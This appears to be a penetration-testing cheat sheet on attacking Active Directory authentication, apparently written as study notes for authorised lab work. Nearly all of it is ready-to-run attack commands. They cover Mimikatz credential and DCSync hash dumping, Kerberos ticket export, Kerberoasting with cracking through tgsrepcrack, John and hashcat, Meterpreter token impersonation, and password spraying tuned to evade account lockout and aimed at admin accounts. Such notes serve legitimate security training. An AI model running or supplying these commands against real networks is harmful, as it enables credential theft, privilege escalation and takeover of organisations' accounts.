## Active Directory Authentication

### Get user hashes with Mimikatz

Note: Requires admin rights and mimikatz standalone executable

```powershell
# Run SeDebugPrivilege to interact with process owned by another account
privilege::debug 
# Dump creds of all logged-on users with SecureLSA module
sekurlsa::logonpasswords
```

Look for hashes like NTLM, SHA1, etc.  The hashes vary based on the AD configuration.

From a Domain Controller, run the following to dump all password hashes

```powershell
privilege::debug
lsadump::lsa /inject
```

You can also dump password hashes from a DC remotely, as shown on this page

https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/

```powershell
# Dump everything
lsadump::dcsync /domain:corp.com /all /csv

# Dump all info for a specific user
lsadump::dcsync /domain:corp.com /user:test
```

### Get Tickets

```powershell
# Show a user's tickets
sekurlsa::tickets
```

A Ticket Granting Service is only good on that specific service, but a Ticket Granting Ticket is good to request more TGS's.

### Download a Ticket to Disk

Once tickets are cached into memory, they can be downloaded to storage

```powershell
kerberos::list /export
```

### Service Account Attacks

Request a service ticket for a known SPN from the DC, extract it from local memory and save it to the disk, then attempt to crack the hash of the service account.

#### The Hard Way (Traditional)

1. Use the Powershell Enumeration Script to search for the service and show the properties to get the SPN  name
   Ex: `{HTTP/CorpWebServer.corp.com}`

2. Use the KerberosRequestorSecurityToken class in Powershell

   ```powershell
   Add-Type -AssemblyName System.IdentityModel
   
   # Options
   System.IdentityModel	# Namespace containing the code segment, not loaded into a Powershell instance by default
   Add-Type -AssemblyName	# Tells Powershell to load an instance
   ```

3. Request a service ticket using the `System.IdentityModel.Tokens.KerberosRequestorSecurityToken` constructor.

   ```powershell
   New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
   ```

   It will load this ticket into the memory of the client.

4. You could use Mimikatz (see above section) or klist to show the cached tickets

   ```powershell
   klist
   ```

5. Use Mimikatz to dump the ticket to disk (see above section)

6. Transfer the file to Kali Linux to start cracking it and make sure kerberoast is installed on Kali

   ```bash
   sudo apt update && sudo apt install kerberoast 
   ```

7. Run tgsrepcrack.py and give it a wordlist and the service ticket to start cracking it.

   ```bash
   python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt /ftphome/1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
   ```

8. Alternately, you can use John the Ripper.

   ```bash
   # Download Kerberoast from Github and use kirbi2john.py from it
   sudo python3 ./kirbi2john.py 1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi > http_jtr_hash
   
   # Crack with John
   john --format=krb5tgs http_jtr_hash --wordlist=wordlist.txt
   ```

#### The Easy Way (Modern)

1. Load `Invoke-Kerberoast.ps1` from the [Empire suite](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) into memory on Windows (remember to set the execution policy to unrestricted)

   ```bash
   . .\Invoke-Kerberoast.ps1
   ```

2. Run the script

   ```powershell
   # JTR format
   Invoke-Kerberoast -OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')}
   
   # Hashcat and maybe also JTR - found this on a website
   Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath HashCapture.txt -Width 8000
   ```

3. It seems like the Hashcat output format works for either JTR or Hashcat, but for the John output format, examine the hash output and make sure there are no extra instances of `$krb5tgs$23$` inside the SPN section (which will occur if the SPN contains a colon).  There were only one instance of that string after the SPN and at the very beginning I had `$krb5tgs`.  If this is not right, it will cause JTR to not recognize the hash.  If you need to see the original hash, just run `Invoke-Kerberoast` by itself.  

4. Paste the hash into a file and feed it to JTR/Hashcat to start cracking.

   ```bash
   hashcat -m 13100 --force <TGSs_file> <passwords_file>
   
   john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
   ```

#### Using Service Accounts

1. After cracking the password of a service account, check it's group memberships

   ```powershell
   net user USERNAME /domain
   ```

2. Some things to try with the account are:

   1. Remote Desktop:

      ```bash
      rdesktop 10.11.1.121 -u username -p password -d domain.com
      ```


Kerberoast Cheat Sheet:  https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

### Impersonation

With a Meterpreter shell and the Incognito module, you can impersonate a loaded ticket (Note: this may require the seimpersonate permission for the current user)

```bash
load incognito
list_tokens -u
impersonate_token sandbox\\Administrator
```

### Low and Slow Password Guessing

Too many failed logins can lockout an account and alert SysAdmins.

#### PowerShell Script

1. Look up the domain account policy:

   ```powershell
   net accounts
   ```

   - Lockout Threshold - shows how many failed attempts trigger a lockout.  You may safely login N-1 times without a lockout.
   - Lockout Duration - shows how many minutes before you get another 'free' login attempt.  This is not a total reset for the threshold, it just gives another single free attempt.
   - We can then use this information to mount an attack against a massive amount of users at once using common weak passwords.

2. Use the same script that was to enumerate user accounts to login as a different user, supplying the username and password.  See the 'AD Password Enumeration' section of  Scripts\Powershell\Scripts\ad_enumeration.md

#### Spray-Passwords.ps1

This custom script allows you to specify parameters and it will use a supplied password or wordlist to brute force multiple users at once.  

https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1

```powershell
.\Spray-Passwords.ps1 -File wordlist.txt -Admin

# Options
-Admin	# Targets privileged user accounts
-File	# Specify a local wordlist
-Pass	# Specify a single password
-Url	# Specify a remote wordlist
```

